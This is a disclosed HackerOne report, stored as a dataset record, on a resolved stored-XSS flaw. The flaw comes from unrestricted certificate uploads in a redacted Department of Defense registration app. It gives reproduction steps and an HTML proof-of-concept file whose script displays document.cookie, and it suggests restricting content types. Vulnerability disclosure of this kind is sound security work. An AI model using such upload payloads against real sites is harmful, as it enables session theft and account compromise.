---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '854445'
original_report_id: '854445'
title: Unrestricted file upload leads to stored xss on https://████████/
weakness: Cross-site Scripting (XSS) - Stored
team_handle: deptofdefense
created_at: '2020-04-20T18:36:42.403Z'
disclosed_at: '2020-05-27T14:24:10.310Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Unrestricted file upload leads to stored xss on https://████████/

## Metadata

- HackerOne Report ID: 854445
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: deptofdefense
- Disclosed At: 2020-05-27T14:24:10.310Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**

When the user want to upload a "certificate", the web app doesn't check the content-type of the file. A user can upload any kind of file (binary,html,...)

## Step-by-step Reproduction Instructions

1. Create an account at https://██████/████████/app/registration/basic-info

2. When you are connected, click on "certification"

Upload this file as xss.html and save the modifications: 

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Test</title>
    <meta name="viewport" content="initial-scale=1.0">
    <meta charset="utf-8">
  </head>
  <body>
    <script>
	alert(document.cookie	)
	</script>
  </body>
</html>
```
3 . Go back to the "certification tab " and open the attachement in a new tab

POC :https://███/████/registration-service/files/███████.html

## Suggested Mitigation/Remediation Actions
Restrict the content-type of the uploaded files

## Impact

The unrestricted file upload vulnerability leads to stored xss.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
